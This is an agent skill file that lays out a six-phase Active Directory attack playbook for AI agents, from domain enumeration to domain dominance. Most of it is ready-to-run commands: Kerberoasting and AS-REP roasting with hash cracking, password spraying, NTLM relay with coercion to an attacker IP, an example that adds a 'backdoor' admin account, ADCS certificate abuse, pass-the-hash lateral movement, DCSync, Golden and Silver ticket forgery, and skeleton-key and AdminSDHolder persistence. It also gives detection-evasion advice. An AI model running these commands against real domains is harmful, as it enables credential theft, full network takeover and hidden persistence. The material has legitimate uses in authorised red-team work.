---
name: active-directory-technique
description: "Active Directory attack methodology for AI agents. Covers domain enumeration (BloodHound, PowerView), credential attacks (Kerberoasting, AS-REP, password spray), NTLM relay chains (Coercer + Responder + ntlmrelayx), certificate abuse (ESC1-8 via Certipy), lateral movement (crackmapexec, evil-winrm, impacket), and domain dominance (DCSync, Golden/Silver ticket). Use after post-exploit-technique delivers a domain-joined foothold or domain credential."
license: MIT
compatibility: "Windows Active Directory environments; Linux attack host; domain-joined or credential-in-hand required for most phases"
metadata:
  author: AeonDave
  version: "1.0"
  category: offensive-techniques
  language: multi
---

# Active Directory Technique

Goal: move from **domain foothold or low-privilege credential to domain dominance** via the shortest confirmed path.

## When this technique applies

- Shell or credential on a domain-joined host (from post-exploit-technique).
- Valid domain user credential (from phishing, spray, NTLM relay, or credential harvest).
- Network access to DC ports (88/Kerberos, 389/LDAP, 445/SMB, 636/LDAPS).
- Red team / pentest requiring AD attack path documentation.
- Need to validate ACL-based privilege paths such as `GenericAll`, `WriteDacl`, `WriteOwner`, or `GenericWrite`.

## Boundary with other skills

- **Input from `post-exploit-technique`**: shell on domain host, harvested NTLM hash or plaintext.
- **Input from `network-technique` §Case E**: NTLM relay setup (Responder + ntlmrelayx).
- **Recon phase**: use `recon-technique` for initial attack surface mapping; this skill assumes you are inside the domain.
- **Cracking**: NTLM/Kerberos hashes from this skill → `cracking-technique` for offline cracking.
- **Lateral movement tooling**: `network-technique` §Case D/H for proxychains, crackmapexec basics.

## Agent operating model

```
Entry point classification:
  A. Shell on domain host (no creds yet) → Phase 1 → Phase 2
  B. Low-privilege domain credential → Phase 2 directly
  C. Network access only (no creds) → Phase 3 (NTLM relay) first

Loop:
  1. Domain enumeration — map attack surface.
  2. Credential attacks — obtain additional hashes/tickets.
  3. NTLM relay — capture and relay without cracking.
  4. Certificate abuse — obtain domain auth via ADCS.
  5. Lateral movement — reach high-value targets.
  6. Domain dominance — DCSync, Golden/Silver ticket, persistence.

Shortest path: BloodHound path from current user to Domain Admin → execute that path.
```

Do not brute-force domain accounts blindly — AD lockout policies are common. Spray once with confirmed policy.

---

## Phase 1 — Domain enumeration

Map the domain before attacking. BloodHound gives the full graph; PowerView for targeted queries.

### BloodHound collection

```powershell
# SharpHound (on target, Windows)
.\SharpHound.exe -c All --zipfilename bh_data.zip

# bloodhound-python (from attack host, Linux)
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c All
```

Import zip into BloodHound. Key queries:
- **Shortest path to DA**: `Shortest Paths to Domain Admins from Owned Principals`
- **Kerberoastable users**: `List all Kerberoastable Accounts`
- **AS-REP roastable**: `Find AS-REP Roastable Users`
- **Unconstrained delegation**: `Find Computers with Unconstrained Delegation`
- **LAPS**: `Find computers where LAPS is enabled`
- **Owned → admin paths**: mark each compromised principal as Owned

See `offensive-tools/windows/bloodhound/`, `offensive-tools/windows/sharphound/`.

### PowerView targeted queries

```powershell
Import-Module .\PowerView.ps1

# Domain context
Get-Domain; Get-DomainController
Get-DomainPolicy | Select -ExpandProperty SystemAccess  # lockout policy!

# Users and groups
Get-DomainUser -Properties samaccountname,memberof,useraccountcontrol,pwdlastset,lastlogon
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# Computers
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp

# ACL abuse paths
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "<username>"}

# Local admin enumeration (noisy — avoid unless targeted)
Find-LocalAdminAccess
```

See `offensive-tools/windows/powerview/`.

Validate ACL edges before acting on them. BloodHound pathing is the starting point; live DACL confirmation prevents stale graph edges and helps choose the lowest-change proof path. Use `references/ad-acl-abuse.md` for rights-to-impact mapping and safe execution discipline.

### enum4linux-ng (from Linux attack host)

```bash
# Full domain enumeration via SMB/RPC
enum4linux-ng -A -u <user> -p <pass> <dc_ip>

# Users, groups, shares, password policy
enum4linux-ng -U -G -S -P -u <user> -p <pass> <dc_ip>
```

See `offensive-tools/windows/enum4linux/`.

→ Full enumeration patterns: `references/ad-enumeration.md`.

---

## Phase 2 — Credential attacks

### Kerberoasting

Request TGS for service accounts → crack offline. Works with any valid domain user.

```bash
# impacket
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc_ip> -request -outputfile kerberoast.txt

# rubeus (on target Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Crack with hashcat (mode 13100)
hashcat -m 13100 kerberoast.txt /path/to/rockyou.txt -r rules/best64.rule
```

High-value targets: SPN accounts with high privilege (check BloodHound → Kerberoastable).

### AS-REP Roasting

Accounts with `DONT_REQ_PREAUTH` set → get encrypted hash without authentication.

```bash
# impacket — no credentials needed
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt

# impacket — with credentials (enumerate automatically)
impacket-GetNPUsers domain.local/user:pass -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt

# rubeus (on target)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /path/to/rockyou.txt
```

### Password spraying

Test one password across many accounts. Respects lockout — always check policy first.

```bash
# Check lockout policy before spraying
enum4linux-ng -P -u <user> -p <pass> <dc_ip>
net accounts /domain   # from Windows

# crackmapexec spray (SMB)
crackmapexec smb <dc_ip> -u users.txt -p 'Password2024!' --continue-on-success

# kerbrute spray (Kerberos — lower noise than SMB)
kerbrute passwordspray -d domain.local --dc <dc_ip> users.txt 'Password2024!'

# trevorspray — LDAP spray (staggered, lockout-aware)
trevorspray -u users.txt -p 'Password2024!' --host <dc_ip> --lockout-threshold 3
```

See `offensive-tools/windows/kerbrute/`, `offensive-tools/windows/trevorspray/`.

→ Full attack patterns, ticket abuse, delegation exploits: `references/kerberos-attacks.md`.

---

## Phase 3 — NTLM relay chain

Capture NTLM authentication and relay to services without cracking. Highly effective in environments without SMB signing.

### SMB signing check

```bash
crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt
# relay_targets.txt = hosts without SMB signing enabled
nmap --script smb2-security-mode -p 445 <subnet>/24
```

### Coercion + relay

```bash
# Step 1: Start ntlmrelayx (attack host — relay to target without signing)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support [-i | -c <cmd> | -socks]

# Step 2: Coerce authentication from victim host
# Coercer — tries all known coercion methods (PetitPotam, PrinterBug, DFSCoerce, etc.)
python3 Coercer.py coerce -u <user> -p <pass> -d domain.local -t <victim_host> -l <attacker_ip>

# Alternative: Responder (passive — wait for auth from network traffic)
responder -I eth0 -wv
```

### Relay impact options

- `-i` → interactive SMB shell on relayed session
- `-c "net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add"` → command execution
- `-socks` → SOCKS proxy through relayed session (use with proxychains)
- `--delegate-access` → Resource-Based Constrained Delegation abuse (creates computer account, gains S4U2self)

→ Full relay chain patterns: `references/ntlm-relay.md`.

---

## Phase 4 — Certificate abuse (ADCS)

Active Directory Certificate Services (ADCS) misconfigurations allow privilege escalation to DA without touching LSASS.

### Enumeration

```bash
# certipy — enumerate ADCS from Linux
certipy find -u <user>@domain.local -p <pass> -dc-ip <dc_ip> -vulnerable -stdout

# certify (Windows)
.\Certify.exe find /vulnerable
```

### ESC1 — Enrollee supplies Subject Alternative Name

Most common misconfiguration: template allows enrollee to specify any SAN (including DA UPN).

```bash
# Request certificate as Domain Admin
certipy req -u <user>@domain.local -p <pass> -ca <CA-name> -template <vuln-template> \
  -upn administrator@domain.local -dc-ip <dc_ip>

# Authenticate with certificate → get TGT → NTLM hash
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>

# Use hash for pass-the-hash or secretsdump
```

### ESC8 — NTLM relay to AD CS HTTP endpoint

Relay NTLM auth to ADCS web enrollment → obtain certificate for domain controller → DCSync.

```bash
# Relay to ADCS instead of SMB
impacket-ntlmrelayx -t http://<ADCS-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC to authenticate to attacker
python3 Coercer.py coerce -u <user> -p <pass> -d domain.local -t <dc_ip> -l <attacker_ip>

# Get DC certificate → authenticate → DCSync
certipy auth -pfx dc.pfx -domain domain.local -username dc$ -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>
```

See `offensive-tools/windows/certipy/`.

→ Full ESC1-8 chains, ADCS enumeration, mitigation-aware selection: `references/certificate-abuse.md`.

---

## Phase 5 — Lateral movement

Move between hosts using confirmed credentials or tickets.

### SMB — command execution

```bash
# crackmapexec — validate + execute (pass plaintext, hash, or ticket)
crackmapexec smb <target> -u <user> -p <pass>                    # login test
crackmapexec smb <target> -u <user> -H <ntlm_hash>              # pass-the-hash
crackmapexec smb <target> -u <user> -p <pass> -x "whoami"       # command execution
crackmapexec smb <subnet>/24 -u <user> -p <pass> --local-auth   # spray with local creds

# impacket psexec / wmiexec / smbexec (different noise levels)
impacket-psexec domain.local/user:pass@<target>          # SYSTEM shell (noisy — creates service)
impacket-wmiexec domain.local/user:pass@<target>         # medium noise, no service
impacket-smbexec domain.local/user:pass@<target>         # lower noise
impacket-psexec domain.local/user@<target> -hashes :NTLMHASH  # pass-the-hash
```

### WinRM — PowerShell remoting

```bash
# evil-winrm (5985/5986 open, user in Remote Management Users)
evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <ntlm_hash>    # pass-the-hash

# Load PowerShell scripts/modules
evil-winrm -i <target> -u <user> -p <pass> -s /path/to/scripts/
```

### Pass-the-Ticket (Kerberos)

```bash
# Import ticket (from Rubeus or secretsdump)
impacket-ticketConverter <ticket.kirbi> ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/<user>@<target>

# Rubeus (Windows)
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

See `offensive-tools/windows/crackmapexec/`, `offensive-tools/windows/evil-winrm/`, `offensive-tools/windows/impacket/`.

→ Full lateral movement patterns: `references/lateral-movement-ad.md`.

---

## Phase 6 — Domain dominance

### DCSync — dump all domain hashes

Requires: Domain Admin, or account with `Replicating Directory Changes` + `Replicating Directory Changes All`.

```bash
# impacket secretsdump (from Linux)
impacket-secretsdump domain.local/administrator:pass@<dc_ip>
impacket-secretsdump -k -no-pass domain.local/administrator@<dc_ip>  # with ticket

# mimikatz (Windows)
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all" "exit"

# Target specific user
impacket-secretsdump domain.local/administrator@<dc_ip> -just-dc-user krbtgt
```

Output: NTLM hashes for every domain user, including `krbtgt` (needed for Golden Ticket).

### Golden Ticket

Forge TGTs for any user, valid for 10 years. Requires `krbtgt` hash.

```bash
# mimikatz
.\mimikatz.exe "kerberos::golden /domain:domain.local /sid:<domain_SID> /rc4:<krbtgt_ntlm> /user:Administrator /id:500 /ptt" "exit"

# impacket ticketer
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <sid> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@<dc_ip>
```

### Silver Ticket

Forge TGS for a specific service without touching DC. Requires service account hash.

```bash
# mimikatz — forge TGS for CIFS on target
.\mimikatz.exe "kerberos::golden /domain:domain.local /sid:<sid> /target:<host.domain.local> /service:cifs /rc4:<service_account_ntlm> /user:Administrator /ptt" "exit"
```

### AD persistence

```powershell
# AdminSDHolder abuse — backdoor ACL propagation every 60 min
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity <backdoor_user> -Rights All

# SID history injection
.\mimikatz.exe "privilege::debug" "misc::addsid <user> <high_priv_SID>" "exit"

# Skeleton key (memory only, non-persistent)
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
# All domain users now accept "mimikatz" as password
```

---

## Quality gates

- Lockout policy confirmed before any spray.
- BloodHound path identified before blind lateral movement attempts.
- NTLM relay verified: target list only includes hosts without SMB signing.
- Certificate abuse: template vulnerability class confirmed before request.
- DCSync: krbtgt hash validated (test decrypt with known user hash).
- All escalation steps documented with exact commands and timestamps.

## Anti-patterns

- Password spraying without lockout threshold check → account lockouts → detection.
- BloodHound collection with `-c All` on large domain without rate control → logs flooded.
- Treating DCSync hash dump as "complete" without validating krbtgt for Golden Ticket.
- Using mimikatz directly on EDR-monitored host without evasion → immediate alert.
- Lateral movement to every reachable host instead of targeting BloodHound DA path.

## Resources

- [references/ad-enumeration.md](references/ad-enumeration.md) — BloodHound query catalog, PowerView cheatsheet, LDAP query patterns, trust enumeration.
- [references/ad-acl-abuse.md](references/ad-acl-abuse.md) — ACL abuse methodology: GenericAll, WriteDACL, WriteOwner, GenericWrite, shadow credentials, RBCD, and reversible proof paths.
- [references/kerberos-attacks.md](references/kerberos-attacks.md) — Kerberoasting, AS-REP, delegation abuse (unconstrained/constrained/RBCD), ticket forgery, S4U attacks.
- [references/ntlm-relay.md](references/ntlm-relay.md) — Relay chain setup, coercion methods, relay target selection, SOCKS relay for tool chaining.
- [references/certificate-abuse.md](references/certificate-abuse.md) — ADCS ESC1-8 attack chains, certificate auth, CA enumeration, PKINIT, shadow credentials.
- [references/lateral-movement-ad.md](references/lateral-movement-ad.md) — Protocol × credential type matrix, WMI/DCOM/RDP/WinRM/SMB patterns, detection signatures to avoid.
